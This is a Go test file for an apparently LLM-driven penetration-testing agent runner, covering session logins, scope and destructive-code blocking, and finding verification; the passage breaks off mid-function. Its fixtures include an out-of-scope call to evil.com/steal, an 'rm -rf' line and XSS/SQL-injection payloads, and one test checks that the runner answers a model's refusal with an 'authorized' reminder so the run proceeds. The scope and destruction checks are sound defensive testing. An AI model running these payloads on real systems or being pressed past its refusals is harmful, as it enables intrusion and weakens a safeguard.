package loop

import (
	"context"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"pentgo/internal/agent"
	"pentgo/internal/runtime/authz"
	"pentgo/internal/runtime/exec"
	sess "pentgo/internal/runtime/session"
	"pentgo/internal/runtime/verify"
	"pentgo/skills"
)

func TestRunnerFeedsAssistantDecisionAndExecutionResultIntoNextTurn(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{
		{Content: "先收集响应。\n```python\nimport os\nprint('probe')\n```"},
		{Content: "TASK_COMPLETE\n已经根据执行结果完成。"},
	}}
	executor := &recordingExecutor{results: []exec.ExecutionResult{{
		Block:    exec.CodeBlock{Index: 1, Language: exec.LanguagePython},
		Status:   exec.ExecutionSucceeded,
		ExitCode: 0,
		Stdout:   "probe-result\n",
	}}}
	runner := NewRunner(client, executor, defaultRunnerConfig(), nil, nil)
	session := sess.NewSession(sess.Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if session.Status != sess.SessionDone || session.StopReason != "task_complete" || session.Turn != 2 {
		t.Fatalf("session = %+v", session)
	}
	if len(client.requests) != 2 {
		t.Fatalf("request count = %d", len(client.requests))
	}
	second := client.requests[1].Messages
	if !containsMessage(second, "assistant", "先收集响应。\n```python\nimport os\nprint('probe')\n```") {
		t.Fatalf("assistant decision missing: %+v", second)
	}
	if !containsMessage(second, "user", "=== PENTGO EXECUTION RESULT ===\nturn: 1\nlanguage: python\nstatus: succeeded\nexit_code: 0\nstdout:\nprobe-result\nstderr:\n\n=== END PENTGO EXECUTION RESULT ===") {
		t.Fatalf("execution result missing: %+v", second)
	}
}

func TestRunnerEstablishesDeclaredSessionBeforeExecutingBlocks(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{
		{Content: "=== PENTGO SESSION ===\n" +
			"name: user_a\n" +
			"role: user\n" +
			"username: alice\n" +
			"login_url: http://fixture.test/login\n" +
			"login_body: username=alice&password=fixture-secret\n" +
			"=== END PENTGO SESSION ===\n" +
			"```python\n" +
			"import os\n" +
			"print('probe')\n" +
			"```"},
		{Content: "TASK_COMPLETE"},
	}}
	verifier := &recordingSessionVerifier{loginResults: []verify.LoginResult{{
		Attempted:           true,
		Verified:            true,
		StatusCode:          200,
		CookieNames:         []string{"sid"},
		MeaningfulCookie:    true,
		SessionCookieHeader: "sid=fixture-cookie",
	}}}
	executor := &recordingExecutor{results: []exec.ExecutionResult{{
		Block:  exec.CodeBlock{Index: 1, Language: exec.LanguagePython},
		Status: exec.ExecutionSucceeded,
		Stdout: "sid=fixture-cookie\n",
	}}}
	config := defaultRunnerConfig()
	config.Verifier = verifier
	runner := NewRunner(client, executor, config, nil, nil)
	session := sess.NewSession(sess.Target{Canonical: "http://fixture.test"}, "check target", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if len(verifier.loginSpecs) != 1 || verifier.loginSpecs[0].LoginURL != "http://fixture.test/login" {
		t.Fatalf("login specs = %+v", verifier.loginSpecs)
	}
	if len(executor.inputs) != 1 || executor.inputs[0].ExtraEnv["PENTGO_SESSION_user_a_COOKIE"] != "sid=fixture-cookie" || executor.inputs[0].ExtraEnv["PENTGO_SESSIONS"] != "user_a" {
		t.Fatalf("execution env = %+v", executor.inputs)
	}
	if len(session.Sessions) != 1 || !session.Sessions[0].Verified || session.Sessions[0].Name != "user_a" || session.Sessions[0].Username != "alice" {
		t.Fatalf("sessions = %+v", session.Sessions)
	}
	encoded, err := json.Marshal(session)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(encoded), "fixture-cookie") || strings.Contains(string(encoded), "fixture-secret") {
		t.Fatalf("session JSON leaked secret: %s", encoded)
	}
	if !containsMessageFragment(client.requests[1].Messages, "user", "SESSION RESULT: user_a verified") {
		t.Fatalf("session result not returned to model: %+v", client.requests[1].Messages)
	}
	for _, message := range client.requests[1].Messages {
		if strings.Contains(message.Content, "fixture-cookie") {
			t.Fatalf("model history leaked session cookie: %+v", client.requests[1].Messages)
		}
	}
}

func TestRunnerDoesNotExportFailedDeclaredSession(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{
		{Content: "=== PENTGO SESSION ===\n" +
			"name: user_a\n" +
			"username: alice\n" +
			"login_url: http://fixture.test/login\n" +
			"login_body: username=alice&password=wrong\n" +
			"=== END PENTGO SESSION ===\n" +
			"```python\nimport os\nprint('probe')\n```"},
		{Content: "TASK_COMPLETE"},
	}}
	verifier := &recordingSessionVerifier{loginResults: []verify.LoginResult{{Attempted: true, Verified: false}}}
	executor := &recordingExecutor{results: []exec.ExecutionResult{{
		Block:  exec.CodeBlock{Index: 1, Language: exec.LanguagePython},
		Status: exec.ExecutionSucceeded,
		Stdout: "probe\n",
	}}}
	config := defaultRunnerConfig()
	config.Verifier = verifier
	runner := NewRunner(client, executor, config, nil, nil)
	session := sess.NewSession(sess.Target{Canonical: "http://fixture.test"}, "check target", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if len(session.Sessions) != 1 || session.Sessions[0].Verified {
		t.Fatalf("sessions = %+v", session.Sessions)
	}
	if len(executor.inputs) != 1 || len(executor.inputs[0].ExtraEnv) != 0 {
		t.Fatalf("failed session env = %+v", executor.inputs)
	}
	if !containsTimelineEvent(session.Timeline, "session_failed") {
		t.Fatalf("timeline = %+v", session.Timeline)
	}
}

func TestRunnerReusesSessionPoolAcrossConsolidatedFindings(t *testing.T) {
	loginPosts := 0
	server := httptest.NewServer(http.HandlerFunc(func(writer http.ResponseWriter, request *http.Request) {
		switch request.URL.Path {
		case "/login":
			if request.Method == http.MethodGet {
				_, _ = io.WriteString(writer, "login form")
				return
			}
			loginPosts++
			http.SetCookie(writer, &http.Cookie{Name: "sid", Value: "pooled", Path: "/"})
			_, _ = io.WriteString(writer, "dashboard")
		case "/one", "/two":
			if !strings.Contains(request.Header.Get("Cookie"), "sid=pooled") {
				writer.Header().Set("Location", "/login")
				writer.WriteHeader(http.StatusFound)
				return
			}
			_, _ = io.WriteString(writer, "<div>"+request.URL.Query().Get("q")+"</div>")
		default:
			t.Fatalf("path %s", request.URL.Path)
		}
	}))
	defer server.Close()

	client := &scriptedClient{responses: []agent.Response{
		{Content: "```python\nimport os\nprint('evidence')\n```"},
		{Content: "TASK_COMPLETE"},
		{Content: "=== PENTGO FINDING ===\n" +
			"type: xss\nmethod: GET\nurl: " + server.URL + "/one?q=%3Cscript%3Ea%3C%2Fscript%3E\n" +
			"payload: <script>a</script>\nlogin_url: " + server.URL + "/login\n" +
			"login_body: username=alice&password=fixture\nusername: alice\nsession_name: user_a\n" +
			"=== END PENTGO FINDING ===\n" +
			"=== PENTGO FINDING ===\n" +
			"type: xss\nmethod: GET\nurl: " + server.URL + "/two?q=%3Cscript%3Eb%3C%2Fscript%3E\n" +
			"payload: <script>b</script>\nlogin_url: " + server.URL + "/login\n" +
			"login_body: username=alice&password=fixture\nusername: alice\nsession_name: user_a\n" +
			"=== END PENTGO FINDING ==="},
	}}
	executor := &recordingExecutor{results: []exec.ExecutionResult{{
		Block:  exec.CodeBlock{Index: 1, Language: exec.LanguagePython},
		Status: exec.ExecutionSucceeded,
		Stdout: "evidence\n",
	}}}
	config := defaultRunnerConfig()
	config.Verifier = verify.NewHTTPVerifier(server.Client(), authz.NewScope(hostOf(server.URL), nil, true), 3)
	runner := NewRunner(client, executor, config, nil, nil)
	session := sess.NewSession(sess.Target{Canonical: server.URL}, "check target", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	findings := runner.ConsolidateAndVerify(context.Background(), session)
	if len(findings) != 2 || loginPosts != 1 {
		t.Fatalf("findings/login posts = %+v/%d", findings, loginPosts)
	}
	if len(session.Sessions) != 1 || !session.Sessions[0].Verified || session.Sessions[0].Name != "user_a" {
		t.Fatalf("sessions = %+v", session.Sessions)
	}
}

func TestRunnerRetriesProviderOnce(t *testing.T) {
	client := &scriptedClient{errors: []error{errors.New("temporary transport error")}, responses: []agent.Response{{Content: "```python\nimport os\nprint('evidence')\n```"}, {Content: "TASK_COMPLETE"}}}
	runner := NewRunner(client, &recordingExecutor{results: []exec.ExecutionResult{{Block: exec.CodeBlock{Index: 1, Language: exec.LanguagePython}, Status: exec.ExecutionSucceeded}}}, defaultRunnerConfig(), nil, func(context.Context, time.Duration) error { return nil })
	session := sess.NewSession(sess.Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if len(client.requests) != 3 || session.Status != sess.SessionDone {
		t.Fatalf("requests/session = %d/%+v", len(client.requests), session)
	}
}

func TestRunnerStopsAfterConfiguredNoCodeLimit(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{{Content: "继续分析"}, {Content: "继续分析"}, {Content: "继续分析"}}}
	config := defaultRunnerConfig()
	config.NoCodeLimit = 3
	runner := NewRunner(client, &recordingExecutor{}, config, nil, nil)
	session := sess.NewSession(sess.Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if session.Status != sess.SessionDone || session.StopReason != "no_executable_response" || session.Turn != 3 {
		t.Fatalf("session = %+v", session)
	}
}

func TestRunnerRunsUnboundedUntilCompletionWhenMaxTurnsZero(t *testing.T) {
	responses := make([]agent.Response, 0, 26)
	for i := 0; i < 25; i++ {
		responses = append(responses, agent.Response{Content: "```python\nimport os\nprint('probe')\n```"})
	}
	responses = append(responses, agent.Response{Content: "TASK_COMPLETE"})
	client := &scriptedClient{responses: responses}
	executor := &recordingExecutor{results: []exec.ExecutionResult{{Block: exec.CodeBlock{Index: 1, Language: exec.LanguagePython}, Status: exec.ExecutionSucceeded, Stdout: "probe\n"}}}
	config := defaultRunnerConfig()
	config.MaxTurns = 0
	config.SoftStuckTurns = 1000
	config.HardStuckTurns = 1000
	runner := NewRunner(client, executor, config, nil, nil)
	session := sess.NewSession(sess.Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if session.Status != sess.SessionDone || session.Turn != 26 {
		t.Fatalf("session = %+v", session)
	}
}

func TestRunnerInjectsSkillContextOnlyOnce(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{{Content: "SKILL_LOAD: recon"}, {Content: "```python\nimport os\nprint('evidence')\n```"}, {Content: "TASK_COMPLETE"}}}
	loader := func(name string) (string, error) {
		if name != "recon" {
			t.Fatalf("skill = %q", name)
		}
		return "recon knowledge", nil
	}
	runner := NewRunner(client, &recordingExecutor{results: []exec.ExecutionResult{{Block: exec.CodeBlock{Index: 1, Language: exec.LanguagePython}, Status: exec.ExecutionSucceeded}}}, defaultRunnerConfig(), loader, nil)
	session := sess.NewSession(sess.Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if len(client.requests) != 3 || !containsMessage(client.requests[1].Messages, "user", "=== PENTGO SKILL CONTEXT ===\nskill: recon\nrecon knowledge\n=== END PENTGO SKILL CONTEXT ===") {
		t.Fatalf("requests = %+v", client.requests)
	}
}

func TestRunnerReturnsPreflightRejectionToModel(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{{Content: "```python\nprint('only text')\n```"}, {Content: "TASK_COMPLETE"}, {Content: "```python\nimport os\nprint('evidence')\n```"}, {Content: "TASK_COMPLETE"}}}
	runner := NewRunner(client, &recordingExecutor{results: []exec.ExecutionResult{{Block: exec.CodeBlock{Index: 1, Language: exec.LanguagePython}, Status: exec.ExecutionSucceeded}}}, defaultRunnerConfig(), nil, nil)
	session := sess.NewSession(sess.Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if len(client.requests) != 4 || !containsMessageFragment(client.requests[1].Messages, "user", "PREFLIGHT REJECTED") {
		t.Fatalf("requests = %+v", client.requests)
	}
}

func TestRunnerRequiresExecutionEvidenceBeforeCompletion(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{{Content: "TASK_COMPLETE"}, {Content: "```python\nimport os\nprint('evidence')\n```"}, {Content: "TASK_COMPLETE"}}}
	runner := NewRunner(client, &recordingExecutor{results: []exec.ExecutionResult{{Block: exec.CodeBlock{Index: 1, Language: exec.LanguagePython}, Status: exec.ExecutionSucceeded, Stdout: "evidence\n"}}}, defaultRunnerConfig(), nil, nil)
	session := sess.NewSession(sess.Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if len(client.requests) != 3 || !containsMessageFragment(client.requests[1].Messages, "user", "EVIDENCE REQUIRED") || session.Status != sess.SessionDone {
		t.Fatalf("requests/session = %+v/%+v", client.requests, session)
	}
}

func TestRunnerReturnsMixedPreflightOutcomesToTheExecutorAndHistory(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{{Content: "```python\nprint('reject')\n```\n```bash\necho accepted\n```"}, {Content: "TASK_COMPLETE"}}}
	executor := &recordingExecutor{results: []exec.ExecutionResult{
		{Block: exec.CodeBlock{Index: 1, Language: exec.LanguagePython}, Status: exec.ExecutionPreflightRejected, ExitCode: -1, Error: "Python block has only print or placeholder code"},
		{Block: exec.CodeBlock{Index: 2, Language: exec.LanguageShell}, Status: exec.ExecutionSucceeded, ExitCode: 0, Stdout: "accepted\n"},
	}}
	runner := NewRunner(client, executor, defaultRunnerConfig(), nil, nil)
	session := sess.NewSession(sess.Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if len(executor.inputs) != 1 || len(executor.inputs[0].Blocks) != 2 || executor.inputs[0].Blocks[0].Approved || !executor.inputs[0].Blocks[1].Approved {
		t.Fatalf("executor inputs = %+v", executor.inputs)
	}
	if !containsMessageFragment(client.requests[1].Messages, "user", "preflight_rejected") {
		t.Fatalf("history = %+v", client.requests[1].Messages)
	}
}

func TestRunnerInjectsSkillCatalogIntoSystemPrompt(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{
		{Content: "```python\nimport os\nprint('evidence')\n```"},
		{Content: "TASK_COMPLETE"},
	}}
	config := defaultRunnerConfig()
	config.SkillCatalog = []skills.Skill{{Name: "recon", Description: "信息收集方法论"}}
	runner := NewRunner(client, &recordingExecutor{results: []exec.ExecutionResult{{Block: exec.CodeBlock{Index: 1, Language: exec.LanguagePython}, Status: exec.ExecutionSucceeded, Stdout: "evidence\n"}}}, config, nil, nil)
	session := sess.NewSession(sess.Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if len(client.requests) == 0 {
		t.Fatal("no requests recorded")
	}
	prompt := client.requests[0].SystemPrompt
	if !strings.Contains(prompt, "recon") || !strings.Contains(prompt, "信息收集方法论") {
		t.Fatalf("system prompt missing catalog: %s", prompt)
	}
}

func TestRunnerRecoversFromRefusalThenProceeds(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{
		{Content: "I can't help with that."},
		{Content: "```python\nimport os\nprint('probe')\n```"},
		{Content: "TASK_COMPLETE"},
	}}
	executor := &recordingExecutor{results: []exec.ExecutionResult{{Block: exec.CodeBlock{Index: 1, Language: exec.LanguagePython}, Status: exec.ExecutionSucceeded, Stdout: "probe\n"}}}
	runner := NewRunner(client, executor, defaultRunnerConfig(), nil, nil)
	session := sess.NewSession(sess.Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if session.Status != sess.SessionDone {
		t.Fatalf("session = %+v", session)
	}
	recovered := false
	for _, event := range session.Timeline {
		if event.Kind == "recovery" && event.Detail == "refusal_recovery" {
			recovered = true
		}
	}
	if !recovered {
		t.Fatalf("expected refusal_recovery event: %+v", session.Timeline)
	}
	if !containsMessageFragment(client.requests[1].Messages, "user", "authorized") {
		t.Fatalf("authorization reminder not fed back: %+v", client.requests[1].Messages)
	}
}

func TestRunnerStopsAfterRefusalLimit(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{
		{Content: "I can't help with that."},
		{Content: "I'm unable to assist."},
		{Content: "I must decline this request."},
	}}
	config := defaultRunnerConfig()
	config.RefusalLimit = 3
	runner := NewRunner(client, &recordingExecutor{}, config, nil, nil)
	session := sess.NewSession(sess.Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if session.Status != sess.SessionFailed || session.StopReason != "refused" {
		t.Fatalf("session = %+v", session)
	}
}

func TestRunnerBlocksOutOfScopeCodeBeforeExecution(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{
		{Content: "外联测试。\n```python\nimport requests\nrequests.get('https://evil.com/steal')\n```"},
		{Content: "```python\nimport requests\nrequests.get('https://example.com/status')\nprint('ok')\n```"},
		{Content: "TASK_COMPLETE"},
	}}
	executor := &recordingExecutor{results: []exec.ExecutionResult{{
		Block: exec.CodeBlock{Index: 1, Language: exec.LanguagePython}, Status: exec.ExecutionSucceeded, Stdout: "ok\n",
	}}}
	config := defaultRunnerConfig()
	config.Authorizer = authz.NewAuthorizer(false)
	config.AllowPrivateHosts = true
	runner := NewRunner(client, executor, config, nil, nil)
	session := sess.NewSession(sess.Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if session.Status != sess.SessionDone {
		t.Fatalf("session = %+v", session)
	}
	blocked := false
	for _, event := range session.Timeline {
		if event.Kind == "recovery" && event.Detail == "authorization_blocked" {
			blocked = true
		}
	}
	if !blocked {
		t.Fatalf("expected authorization_blocked timeline event: %+v", session.Timeline)
	}
	if len(client.requests) < 2 {
		t.Fatalf("request count = %d", len(client.requests))
	}
	if !containsMessageFragment(client.requests[1].Messages, "user", "out of authorized scope") {
		t.Fatalf("scope rejection not fed back: %+v", client.requests[1].Messages)
	}
}

func TestRunnerBlocksDestructiveCodeBeforeExecution(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{
		{Content: "```bash\nrm -rf /tmp/loot\n```"},
		{Content: "```python\nimport requests\nrequests.get('https://example.com/status')\nprint('ok')\n```"},
		{Content: "TASK_COMPLETE"},
	}}
	executor := &recordingExecutor{results: []exec.ExecutionResult{{
		Block: exec.CodeBlock{Index: 1, Language: exec.LanguagePython}, Status: exec.ExecutionSucceeded, Stdout: "ok\n",
	}}}
	config := defaultRunnerConfig()
	config.Authorizer = authz.NewAuthorizer(false)
	runner := NewRunner(client, executor, config, nil, nil)
	session := sess.NewSession(sess.Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if !containsMessageFragment(client.requests[1].Messages, "user", "destructive") {
		t.Fatalf("destructive rejection not fed back: %+v", client.requests[1].Messages)
	}
}

func TestRunnerCapsBlocksPerTurn(t *testing.T) {
	var blocks []string
	for i := 0; i < 5; i++ {
		blocks = append(blocks, "```python\nimport os\nprint('b"+string(rune('0'+i))+"')\n```")
	}
	client := &scriptedClient{responses: []agent.Response{
		{Content: strings.Join(blocks, "\n")},
		{Content: "TASK_COMPLETE"},
	}}
	executor := &recordingExecutor{results: []exec.ExecutionResult{{Block: exec.CodeBlock{Index: 1, Language: exec.LanguagePython}, Status: exec.ExecutionSucceeded, Stdout: "b0\n"}}}
	config := defaultRunnerConfig()
	config.MaxBlocksPerTurn = 2
	runner := NewRunner(client, executor, config, nil, nil)
	session := sess.NewSession(sess.Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	capped := false
	for _, event := range session.Timeline {
		if event.Kind == "recovery" && event.Detail == "too_many_blocks" {
			capped = true
		}
	}
	if !capped {
		t.Fatalf("expected too_many_blocks event: %+v", session.Timeline)
	}
	if !containsMessageFragment(client.requests[1].Messages, "user", "TOO MANY BLOCKS") {
		t.Fatalf("cap reminder not fed back: %+v", client.requests[1].Messages)
	}
	if got := executor.lastBlockCount(); got != 2 {
		t.Fatalf("executed %d blocks, want 2", got)
	}
}

func TestRunnerConsolidatesAndVerifiesFindings(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{{Content: `
=== PENTGO FINDING ===
type: xss
method: GET
url: https://example.com/?q=payload
baseline_url: https://example.com/?q=benign
payload: payload
=== END PENTGO FINDING ===
=== PENTGO FINDING ===
type: sqli
method: GET
url: https://example.com/?id=1%27
baseline_url: https://example.com/?id=1
payload: id=1%27
=== END PENTGO FINDING ===`}}}
	verifier := &recordingFindingVerifier{results: []verify.VerificationResult{
		{Verdict: verify.VerdictVerified, VulnType: verify.VulnXSS},
		{Verdict: verify.VerdictRefuted, VulnType: verify.VulnSQLI},
	}}
	config := defaultRunnerConfig()
	config.MaxFindings = 2
	config.Verifier = verifier
	runner := NewRunner(client, &recordingExecutor{}, config, nil, nil)
	runner.history = NewHistory("https://example.com", "check target")
	session := sess.NewSession(sess.Target{Canonical: "https://example.com"}, "check target", time.Now().UTC())
	session.Status = sess.SessionDone

	findings := runner.ConsolidateAndVerify(context.Background(), session)
	if len(findings) != 2 || findings[0].Verdict != verify.VerdictVerified || findings[1].Verdict != verify.VerdictRefuted {
		t.Fatalf("findings = %+v", findings)
	}
	if len(verifier.specs) != 2 || len(client.requests) != 1 {
		t.Fatalf("verifier requests/specs = %d/%d", len(client.requests), len(verifier.specs))
	}
	if !containsMessageFragment(client.requests[0].Messages, "user", "PENTGO FINDING") {
		t.Fatalf("consolidation prompt missing: %+v", client.requests[0].Messages)
	}
}

func TestRunnerPersistsConsolidatedFindingsInSession(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{{Content: `
=== PENTGO FINDING ===
type: xss
method: GET
url: https://example.com/?q=payload
payload: payload
=== END PENTGO FINDING ===`}}}
	verifier := &recordingFindingVerifier{results: []verify.VerificationResult{{
		Verdict:  verify.VerdictVerified,
		VulnType: verify.VulnXSS,
		Summary:  "xss VERIFIED confidence=0.95",
	}}}
	config := defaultRunnerConfig()
	config.Verifier = verifier
	runner := NewRunner(client, &recordingExecutor{}, config, nil, nil)
	runner.history = NewHistory("https://example.com", "check target")
	session := sess.NewSession(sess.Target{Canonical: "https://example.com"}, "check target", time.Now().UTC())
	session.Status = sess.SessionDone

	runner.ConsolidateAndVerify(context.Background(), session)
	if len(session.Findings) != 1 || session.Findings[0].Verdict != verify.VerdictVerified {
		t.Fatalf("session findings = %+v", session.Findings)
	}
	encoded, err := json.Marshal(session)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(encoded), `"findings"`) || !strings.Contains(string(encoded), `"VERIFIED"`) {
		t.Fatalf("session JSON = %s", encoded)
	}
}

func TestRunnerPersistsFrameworkVerificationEvidence(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{{Content: `
=== PENTGO FINDING ===
type: xss
method: GET
url: https://example.com/?q=payload
baseline_url: https://example.com/?q=benign
payload: payload
=== END PENTGO FINDING ===`}}}
	verifier := &recordingFindingVerifier{
		results: []verify.VerificationResult{{Verdict: verify.VerdictVerified, VulnType: verify.VulnXSS, Confidence: 0.95, Curl: "curl -i -X GET 'https://example.com/?q=payload'"}},
		records: []verify.VerificationRecord{{
			Method:               "GET",
			PayloadURL:           "https://example.com/?q=payload",
			BaselineURL:          "https://example.com/?q=benign",
			PayloadStatus:        200,
			PayloadResponseBody:  "<div>payload</div>",
			BaselineStatus:       200,
			BaselineResponseBody: "<div>benign</div>",
			Reproductions:        3,
		}},
	}
	sink := &memoryEvidenceSink{}
	config := defaultRunnerConfig()
	config.Verifier = verifier
	config.EvidenceSink = sink
	runner := NewRunner(client, &recordingExecutor{}, config, nil, nil)
	runner.history = NewHistory("https://example.com", "check target")
	session := sess.NewSession(sess.Target{Canonical: "https://example.com"}, "check target", time.Now().UTC())
	session.Status = sess.SessionDone

	findings := runner.ConsolidateAndVerify(context.Background(), session)
	if len(findings) != 1 || findings[0].EvidencePath != "evidence/verification-001.json" {
		t.Fatalf("findings = %+v", findings)
	}
	if sink.name != "verification-001" {
		t.Fatalf("evidence name = %q", sink.name)
	}
	evidence, ok := sink.value.(verificationEvidence)
	if !ok {
		t.Fatalf("evidence = %#v", sink.value)
	}
	if evidence.PayloadResponseBody != "<div>payload</div>" || evidence.BaselineResponseBody != "<div>benign</div>" {
		t.Fatalf("evidence bodies = %+v", evidence)
	}
}

func TestFindingConsolidationPromptDeclaresAuthenticatedFindingFields(t *testing.T) {
	for _, want := range []string{
		"credential",
		"idor",
		"login_url",
		"login_url_b",
		"login_method",
		"login_body",
		"login_content_type",
		"username",
		"username_b",
		"only execution evidence",
		"two-user",
	} {
		if !strings.Contains(strings.ToLower(findingConsolidationSystemPrompt), strings.ToLower(want)) {
			t.Fatalf("consolidation prompt missing %q: %s", want, findingConsolidationSystemPrompt)
		}
	}
}

func TestRunnerPersistsRedactedLoginEvidence(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{{Content: `
=== PENTGO FINDING ===
type: credential
login_url: https://example.com/login
login_body: username=fixture&password=fixture-secret
username: fixture
=== END PENTGO FINDING ===`}}}
	verifier := &recordingFindingVerifier{
		results: []verify.VerificationResult{{
			Verdict:          verify.VerdictLikely,
			VulnType:         verify.VulnCredential,
			Confidence:       0.55,
			Curl:             "curl --data-raw 'username=fixture&password=REDACTED'",
			LoginVerified:    true,
			LoginCookieNames: []string{"sid"},
			Username:         "fixture",
		}},
		records: []verify.VerificationRecord{{
			Method:                "POST",
			PayloadURL:            "https://example.com/login",
			RequestHeaders:        map[string]string{"Cookie": "sid=fixture-cookie", "X-Test": "value"},
			LoginAttempted:        true,
			LoginVerified:         true,
			LoginStatus:           200,
			LoginCookieNames:      []string{"sid"},
			LoginMeaningfulCookie: true,
			LoginSnippet:          "dashboard",
		}},
	}
	sink := &memoryEvidenceSink{}
	config := defaultRunnerConfig()
	config.Verifier = verifier
	config.EvidenceSink = sink
	runner := NewRunner(client, &recordingExecutor{}, config, nil, nil)
	runner.history = NewHistory("https://example.com", "check target")
	session := sess.NewSession(sess.Target{Canonical: "https://example.com"}, "check target", time.Now().UTC())
	session.Status = sess.SessionDone

	runner.ConsolidateAndVerify(context.Background(), session)
	evidence, ok := sink.value.(verificationEvidence)
	if !ok {
		t.Fatalf("evidence = %#v", sink.value)
	}
	if !evidence.LoginAttempted || !evidence.LoginVerified || evidence.LoginStatus != 200 || !evidence.LoginMeaningfulCookie || len(evidence.LoginCookieNames) != 1 || evidence.LoginCookieNames[0] != "sid" {
		t.Fatalf("login evidence = %+v", evidence)
	}
	encoded, err := json.Marshal(evidence)
	if err != nil {
		t.Fatal(err)
	}
	for _, secret := range []string{"fixture-secret", "fixture-cookie"} {
		if strings.Contains(string(encoded), secret) {
			t.Fatalf("evidence leaked %q: %s", secret, encoded)
		}
	}
}

func TestRunnerContinuesWhenVerificationEvidenceWriteFails(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{{Content: `
=== PENTGO FINDING ===
type: xss
method: GET
url: https://example.com/?q=payload
payload: payload
=== END PENTGO FINDING ===`}}}
	verifier := &recordingFindingVerifier{results: []verify.VerificationResult{{Verdict: verify.VerdictVerified, VulnType: verify.VulnXSS}}}
	config := defaultRunnerConfig()
	config.Verifier = verifier
	config.EvidenceSink = evidenceSinkFunc(func(string, any) (string, error) {
		return "", errors.New("disk unavailable")
	})
	runner := NewRunner(client, &recordingExecutor{}, config, nil, nil)
	runner.history = NewHistory("https://example.com", "check target")
	session := sess.NewSession(sess.Target{Canonical: "https://example.com"}, "check target", time.Now().UTC())
	session.Status = sess.SessionDone

	findings := runner.ConsolidateAndVerify(context.Background(), session)
	if len(findings) != 1 || len(session.Findings) != 1 {
		t.Fatalf("findings/session findings = %+v/%+v", findings, session.Findings)
	}
	for _, event := range session.Timeline {
		if event.Kind == "verification_evidence_error" && strings.Contains(event.Detail, "disk unavailable") {
			return
		}
	}
	t.Fatalf("timeline missing verification evidence error: %+v", session.Timeline)
}

func TestRunnerCapsConsolidatedFindings(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{{Content: `
=== PENTGO FINDING ===
type: xss
url: https://example.com/?q=one
payload: one
=== END PENTGO FINDING ===
=== PENTGO FINDING ===
type: xss
url: https://example.com/?q=two
payload: two
=== END PENTGO FINDING ===`}}}
	verifier := &recordingFindingVerifier{results: []verify.VerificationResult{{Verdict: verify.VerdictVerified, VulnType: verify.VulnXSS}}}
	config := defaultRunnerConfig()
	config.MaxFindings = 1
	config.Verifier = verifier
	runner := NewRunner(client, &recordingExecutor{}, config, nil, nil)
	runner.history = NewHistory("https://example.com", "check target")
	session := sess.NewSession(sess.Target{Canonical: "https://example.com"}, "check target", time.Now().UTC())
	session.Status = sess.SessionDone

	findings := runner.ConsolidateAndVerify(context.Background(), session)
	if len(findings) != 1 || len(verifier.specs) != 1 {
		t.Fatalf("findings/specs = %d/%d", len(findings), len(verifier.specs))
	}
}

func TestRunnerSkipsConsolidationUntilSessionDone(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{{Content: "unexpected"}}}
	verifier := &recordingFindingVerifier{}
	config := defaultRunnerConfig()
	config.Verifier = verifier
	runner := NewRunner(client, &recordingExecutor{}, config, nil, nil)
	runner.history = NewHistory("https://example.com", "check target")
